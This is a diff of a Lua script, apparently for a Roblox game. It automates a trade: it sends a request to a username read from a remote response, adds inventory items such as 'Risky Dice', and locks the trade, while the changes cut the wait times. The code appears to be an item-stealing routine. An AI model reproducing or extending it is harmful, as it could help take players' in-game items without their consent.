@@ -762,9 +762,9 @@ else
                         end                        
                     else
                         if checkmaininsv() then
-                            print("dit me may 2??")
+print("dit me may 2??")
                             v_u_9.TRADE_SEND_REQUEST:Invoke(game:GetService("Players")[jsondecode(checkmain.Body).username].UserId, false, true)
-                            wait(10)
+                            wait(3)
                             for i,v in pairs(dectectinven()) do
                                 print("dmm?", v)
                                 wait(1)
@@ -786,7 +786,16 @@ else
                             }
                             
                             letfkinggo(p63.TRADE_UPDATE_CONTENTS, unpack(args))
-                            wait(5)
+                            wait(2)
+                            local args = {
+                                [1] = "Risky Dice",
+                                [2] = "Items",
+                                [3] = inventory().Items["Risky Dice"],
+                                [4] = true
+                            }
+                            
+                            letfkinggo(p63.TRADE_UPDATE_CONTENTS, unpack(args))
+                            wait(3)
                             local args = {
                                 [1] = "TRADE_LOCK",
                                 [4] = true
